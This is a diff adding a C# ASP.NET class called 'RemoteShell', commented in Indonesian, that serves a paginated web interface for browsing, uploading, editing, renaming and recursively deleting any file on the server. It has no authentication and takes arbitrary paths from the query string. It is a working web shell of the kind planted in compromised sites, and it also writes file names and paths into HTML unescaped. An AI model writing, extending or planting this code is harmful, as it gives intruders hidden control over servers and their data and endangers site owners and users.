@@ -1,0 +1,217 @@
+using System;
+using System.Web;
+using System.IO;
+using System.Collections.Generic; // Wajib untuk List<>
+using System.Linq; // Wajib untuk Skip/Take (Pagination)
+
+public class RemoteShell
+{
+    public void Run(HttpContext context)
+    {
+        context.Response.ContentType = "text/html";
+        
+        // --- KONFIGURASI PAGINATION ---
+        int pageSize = 50; // Jumlah file per halaman
+        
+        string action = context.Request.QueryString["action"];
+        string dir = context.Request.QueryString["dir"];
+        string file = context.Request.QueryString["file"];
+        string pageStr = context.Request.QueryString["page"];
+        
+        int currentPage = 1;
+        if (!string.IsNullOrEmpty(pageStr)) int.TryParse(pageStr, out currentPage);
+        if (currentPage < 1) currentPage = 1;
+
+        string currentDirectory = dir ?? context.Server.MapPath("~/");
+
+        // --- HANDLE POST (UPLOAD/SAVE/RENAME) ---
+        // (Sama seperti sebelumnya, tidak berubah)
+        if (context.Request.HttpMethod == "POST")
+        {
+            string postAction = context.Request.Form["cmd"];
+            if (postAction == "upload" && context.Request.Files.Count > 0)
+            {
+                HttpPostedFile uploadedFile = context.Request.Files[0];
+                uploadedFile.SaveAs(Path.Combine(currentDirectory, uploadedFile.FileName));
+                context.Response.Redirect(GetUrl(context, "dir", currentDirectory));
+            }
+            else if (postAction == "save" && !string.IsNullOrEmpty(file))
+            {
+                File.WriteAllText(file, context.Request.Form["fileContent"]);
+                context.Response.Redirect(GetUrl(context, "action", "edit", "file", file));
+            }
+            else if (postAction == "rename_submit")
+            {
+                string targetPath = context.Request.Form["targetPath"];
+                string newName = context.Request.Form["newName"];
+                if (!string.IsNullOrEmpty(targetPath) && !string.IsNullOrEmpty(newName))
+                {
+                    string newPath = Path.Combine(Path.GetDirectoryName(targetPath), newName);
+                    if (Directory.Exists(targetPath)) Directory.Move(targetPath, newPath);
+                    else if (File.Exists(targetPath)) File.Move(targetPath, newPath);
+                    context.Response.Redirect(GetUrl(context, "dir", Path.GetDirectoryName(newPath)));
+                }
+            }
+        }
+
+        // --- HANDLE DELETE ---
+        if (action == "delete" && !string.IsNullOrEmpty(dir ?? file))
+        {
+            string targetDelete = dir ?? file;
+            if (Directory.Exists(targetDelete)) Directory.Delete(targetDelete, true);
+            else if (File.Exists(targetDelete)) File.Delete(targetDelete);
+            context.Response.Redirect(GetUrl(context, "dir", Path.GetDirectoryName(targetDelete)));
+        }
+
+        // --- RENDER HTML ---
+        string css = @"
+        <style>
+            body { font-family: Arial, sans-serif; background: #1a1a1a; color: #ddd; margin: 0; padding: 20px; font-size: 13px; }
+            a { color: #4da6ff; text-decoration: none; } a:hover { text-decoration: underline; }
+            .container { max-width: 900px; margin: 0 auto; background: #2d2d2d; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+            .info { margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 10px; }
+            .info div { margin-bottom: 5px; }
+            table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+            th, td { border: 1px solid #444; padding: 8px; text-align: left; }
+            th { background-color: #333; }
+            .dir-item { color: #ffd700; font-weight: bold; }
+            .file-item { color: #ccc; }
+            .pagination { margin-top: 15px; text-align: center; }
+            .pagination a, .pagination strong { margin: 0 3px; padding: 5px 10px; border: 1px solid #444; background: #333; display: inline-block; }
+            .pagination strong { background: #4da6ff; color: #000; border-color: #4da6ff; }
+            textarea { width: 100%; background: #222; color: #fff; border: 1px solid #444; padding: 5px; }
+        </style>";
+
+        context.Response.Write("<!DOCTYPE html><html><head><title>Remote Shell Paging</title>" + css + "</head><body>");
+        context.Response.Write("<div class='container'><h1>Remote Shell + Pagination</h1>");
+
+        // Info System
+        context.Response.Write("<div class='info'>");
+        context.Response.Write("<div><strong>Path:</strong> ");
+        string[] pathParts = currentDirectory.Split(new char[] { Path.DirectorySeparatorChar }, StringSplitOptions.RemoveEmptyEntries);
+        string pathBuilder = "";
+        foreach (string part in pathParts) {
+            pathBuilder += part + Path.DirectorySeparatorChar;
+            context.Response.Write(string.Format("<a href='?dir={0}'>{1}</a>{2}", context.Server.UrlEncode(pathBuilder), part, Path.DirectorySeparatorChar));
+        }
+        context.Response.Write("</div>");
+        context.Response.Write("<div><a href='?dir=" + context.Server.UrlEncode(currentDirectory) + "'>[ Refresh ]</a></div>");
+        context.Response.Write("</div>");
+
+        // Upload Form
+        context.Response.Write("<form method='post' enctype='multipart/form-data' style='margin-bottom:15px;'>");
+        context.Response.Write("<input type='hidden' name='cmd' value='upload'>");
+        context.Response.Write("<input type='file' name='fileUpload'> <input type='submit' value='Upload Here'>");
+        context.Response.Write("</form>");
+
+        // --- LOGIKA UTAMA VIEW ---
+        if (action == "rename" || action == "edit")
+        {
+            // Tampilan Rename/Edit (Sama seperti sebelumnya)
+             if (action == "rename") {
+                string p = dir ?? file;
+                context.Response.Write("<h3>Rename: " + Path.GetFileName(p) + "</h3><form method='post'><input type='hidden' name='cmd' value='rename_submit'><input type='hidden' name='targetPath' value='" + p + "'><input type='text' name='newName' value='" + Path.GetFileName(p) + "'> <input type='submit' value='Save'></form>");
+             } else {
+                string c = File.ReadAllText(file);
+                context.Response.Write("<h3>Edit: " + Path.GetFileName(file) + "</h3><form method='post'><input type='hidden' name='cmd' value='save'><textarea name='fileContent' rows='20'>" + HttpUtility.HtmlEncode(c) + "</textarea><br><input type='submit' value='Save'></form>");
+             }
+             context.Response.Write("<br><a href='?dir=" + context.Server.UrlEncode(currentDirectory) + "'>&laquo; Back</a>");
+        }
+        else
+        {
+            // --- LOGIKA LIST FILE & PAGINATION ---
+            try 
+            {
+                // 1. Ambil semua item (Folder & File)
+                List<FileSystemInfo> allItems = new List<FileSystemInfo>();
+                
+                string[] dirs = Directory.GetDirectories(currentDirectory);
+                foreach(string d in dirs) allItems.Add(new DirectoryInfo(d));
+                
+                string[] files = Directory.GetFiles(currentDirectory);
+                foreach(string f in files) allItems.Add(new FileInfo(f));
+
+                // 2. Hitung Pagination
+                int totalItems = allItems.Count;
+                int totalPages = (int)Math.Ceiling((double)totalItems / pageSize);
+                
+                // 3. Ambil item untuk halaman ini saja (Slice)
+                var pageItems = allItems.Skip((currentPage - 1) * pageSize).Take(pageSize);
+
+                // 4. Render Table
+                context.Response.Write("<table><thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Actions</th></tr></thead><tbody>");
+                
+                foreach (var item in pageItems)
+                {
+                    bool isDir = (item.Attributes & FileAttributes.Directory) == FileAttributes.Directory;
+                    string name = item.Name;
+                    string fullPath = item.FullName;
+                    string sizeStr = isDir ? "-" : ((FileInfo)item).Length + " bytes";
+                    string typeStr = isDir ? "DIR" : item.Extension;
+                    string link = isDir ? "?dir=" + context.Server.UrlEncode(fullPath) : "?action=edit&file=" + context.Server.UrlEncode(fullPath);
+                    string classStyle = isDir ? "dir-item" : "file-item";
+                    
+                    context.Response.Write("<tr>");
+                    context.Response.Write(string.Format("<td><a href='{0}' class='{1}'>{2}</a></td>", link, classStyle, name));
+                    context.Response.Write(string.Format("<td>{0}</td>", sizeStr));
+                    context.Response.Write(string.Format("<td>{0}</td>", typeStr));
+                    
+                    // Action Links
+                    string delLink = isDir ? "?action=delete&dir=" + context.Server.UrlEncode(fullPath) : "?action=delete&file=" + context.Server.UrlEncode(fullPath);
+                    string renLink = isDir ? "?action=rename&dir=" + context.Server.UrlEncode(fullPath) : "?action=rename&file=" + context.Server.UrlEncode(fullPath);
+                    
+                    context.Response.Write(string.Format("<td><a href='{0}'>Ren</a> | <a href='{1}' onclick=\"return confirm('Del?')\">Del</a></td>", renLink, delLink));
+                    context.Response.Write("</tr>");
+                }
+                context.Response.Write("</tbody></table>");
+
+                // 5. Render Tombol Pagination
+                if (totalPages > 1)
+                {
+                    context.Response.Write("<div class='pagination'>");
+                    string baseLink = "?dir=" + context.Server.UrlEncode(currentDirectory) + "&page=";
+                    
+                    // Tombol Prev
+                    if (currentPage > 1) context.Response.Write(string.Format("<a href='{0}'>&laquo; Prev</a>", baseLink + (currentPage - 1)));
+                    
+                    // Tampilkan halaman sekitar (agar tidak terlalu panjang jika ada 100 halaman)
+                    int startPage = Math.Max(1, currentPage - 5);
+                    int endPage = Math.Min(totalPages, currentPage + 5);
+
+                    if(startPage > 1) context.Response.Write(string.Format("<a href='{0}'>1</a> ... ", baseLink + "1"));
+
+                    for (int i = startPage; i <= endPage; i++)
+                    {
+                        if (i == currentPage) context.Response.Write(string.Format("<strong>{0}</strong>", i));
+                        else context.Response.Write(string.Format("<a href='{0}'>{1}</a>", baseLink + i, i));
+                    }
+
+                    if(endPage < totalPages) context.Response.Write(string.Format(" ... <a href='{0}'>{1}</a>", baseLink + totalPages, totalPages));
+
+                    // Tombol Next
+                    if (currentPage < totalPages) context.Response.Write(string.Format("<a href='{0}'>Next &raquo;</a>", baseLink + (currentPage + 1)));
+                    
+                    context.Response.Write("</div>");
+                    context.Response.Write("<div style='text-align:center; margin-top:5px; color:#666;'>Total: " + totalItems + " items</div>");
+                }
+            }
+            catch (Exception ex)
+            {
+                context.Response.Write("<div style='color:red; padding:10px;'>Error: " + ex.Message + "</div>");
+            }
+        }
+
+        context.Response.Write("</div></body></html>");
+    }
+
+    // Helper URL
+    private string GetUrl(HttpContext context, params string[] queryParams)
+    {
+        var qs = HttpUtility.ParseQueryString("");
+        for (int i = 0; i < queryParams.Length; i += 2)
+        {
+            if (i + 1 < queryParams.Length) qs[queryParams[i]] = queryParams[i + 1];
+        }
+        return context.Request.Url.AbsolutePath + "?" + qs.ToString();
+    }
+}
